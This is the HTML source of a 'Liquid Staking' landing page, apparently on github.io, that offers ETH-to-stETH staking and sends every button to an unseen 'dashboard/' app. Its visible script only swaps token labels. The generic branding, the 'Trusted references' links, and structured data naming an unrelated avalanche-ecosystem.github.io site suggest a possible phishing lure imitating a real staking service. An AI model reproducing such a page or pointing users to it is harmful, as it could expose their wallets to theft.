<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Liquid Staking</title>
  <meta name="description" content="Liquid Staking lets you stake ETH and receive a liquid token you can use across DeFi from your own wallet.">
  <link rel="canonical" href="https://liquidstaking.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F4F6FB">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Liquid Staking">
  <meta property="og:description" content="Liquid Staking lets you stake ETH and receive a liquid token you can use across DeFi from your own wallet.">
  <meta property="og:url" content="https://liquidstaking.github.io/">
  <meta property="og:image" content="https://liquidstaking.github.io/og-cover.png">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Liquid Staking">
  <meta name="twitter:description" content="Stake ETH and receive a liquid token you can use across DeFi.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="stylesheet" href="style.css">

  <link rel="prefetch" href="dashboard/">
  <link rel="prerender" href="dashboard/">
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#"><img src="favicon.png" width="28" height="28" alt="" style="border-radius:50%"> Liquid Staking</a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/staking/" target="_blank" rel="nofollow noopener noreferrer">Staking</a>
      <a href="https://defillama.com/lsd" target="_blank" rel="nofollow noopener noreferrer">DefiLlama LSD</a>
    </nav>
    <span class="sp"></span>
    <a class="ghost" href="dashboard/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <h1>Liquid Staking</h1>
    <p class="sub"><strong>Liquid Staking</strong> lets you stake ETH and receive a liquid token you can use across DeFi from your own wallet.</p>

    <section class="card" aria-label="Staking route">
      <div class="route">
        <div class="leg">
          <span class="lbl">Stake</span>
          <span class="chip">
            <img class="ic" src="eth.png" width="26" height="26" alt="ETH">
            <span class="t">ETH</span>
          </span>
        </div>
        <button class="dir" type="button" data-dir aria-label="Switch direction"><span class="ar">&#8594;</span></button>
        <div class="leg">
          <span class="lbl">Receive</span>
          <span class="chip">
            <img class="ic" src="steth.png" width="26" height="26" alt="stETH">
            <span class="t">stETH</span>
          </span>
        </div>
      </div>
      <a class="act" href="dashboard/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
      <p class="note">Preview only &mdash; rewards and terms are shown in the app.</p>
    </section>
  </main>

  <footer class="foot">
    <b>Liquid Staking</b> &mdash; 2026
  </footer>

  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      { "@type": "WebSite", "@id": "https://avalanche-ecosystem.github.io/#website", "url": "https://avalanche-ecosystem.github.io/", "name": "Liquid Staking", "inLanguage": "en" },
      { "@type": "Organization", "@id": "https://avalanche-ecosystem.github.io/#org", "name": "Liquid Staking", "url": "https://avalanche-ecosystem.github.io/" },
      { "@type": "WebApplication", "@id": "https://avalanche-ecosystem.github.io/#app", "name": "Liquid Staking", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "url": "https://avalanche-ecosystem.github.io/", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" } }
    ]
  }
  </script>

  <script>
  (function(){
    "use strict";
    var root=document, btn=root.querySelector('[data-dir]');
    if(!btn) return;
    btn.addEventListener('click', function(){
      var chips=root.querySelectorAll('.leg .chip');
      if(chips.length>=2){ var t=chips[0].innerHTML; chips[0].innerHTML=chips[1].innerHTML; chips[1].innerHTML=t; }
    });
  })();
  </script>
</body>
</html>
